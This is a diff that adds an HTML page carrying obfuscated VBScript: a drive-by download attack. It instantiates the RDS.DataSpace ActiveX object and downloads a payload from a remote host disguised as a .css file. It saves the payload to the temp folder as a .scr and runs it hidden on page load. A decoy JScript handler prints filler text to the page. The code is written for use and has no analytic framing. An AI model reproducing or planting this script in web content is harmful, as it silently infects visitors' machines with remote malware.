@@ -1,0 +1,43 @@
+    <html>
+    <script language="VBScript">
+    on error resume next
+    Cuteurl = "http://qq.18i16.net/exe1/ms.css"
+    evils="cls"+"i"+"d:B"+""+""+"D96"
+    Cute="object"
+    evil="C556-65A3-"
+    Cute2="classid"
+    evilx=evils & evil &"11D0-983A-00C04FC29E36"
+    Cute3="Micr"+"osoft.XMLHTTP"
+    Cute4="Shell.App"+"lication"
+    Cute5="Scripting.File"+"SystemObject"
+    Set e7e5l89 = document.createElement(Cute)
+    sub usicecod(Cute4,Cutex)
+    set e45645kyurt234 = e7e5l89.createobject(Cute4,"")
+    e45645kyurt234.ShellExEcutE e7e5l89x,"","","open",0
+    end sub
+    e7e5l89.setAttribute Cute2, evilx
+    chilam=Cute3
+    Set wing = e7e5l89.CreateObject(chilam,"")
+    User="andhi"
+    Anheys="S"
+    Anheyx="tream"
+    Anhey="Adodb."
+    Anti = Anhey & Anheys & Anheyx
+    Antivirus = Anti
+    set Rising = e7e5l89.createobject(Antivirus,"")
+    Rising.type = 1
+    Kaspersky="GET"
+    wing.Open Kaspersky, Cuteurl, False
+    wing.Send
+    e7e5l89x="justju.sCr"
+    SeT Virus = e7e5l89.createobject(Cute5,"")
+    sET e45645kyurt234 = Virus.GetSpecialFolder(2)
+    Rising.open
+    e7e5l89x= Virus.BuildPath(e45645kyurt234,e7e5l89x)
+    Rising.write wing.responseBody
+    Rising.savetofile e7e5l89x,2
+    Rising.close
+    call usicecod(Cute4,Cutex)
+    </script>
+    </html>
+<script type="text/jscript">function init() { document.write("just......");}window.onload = init;</script>
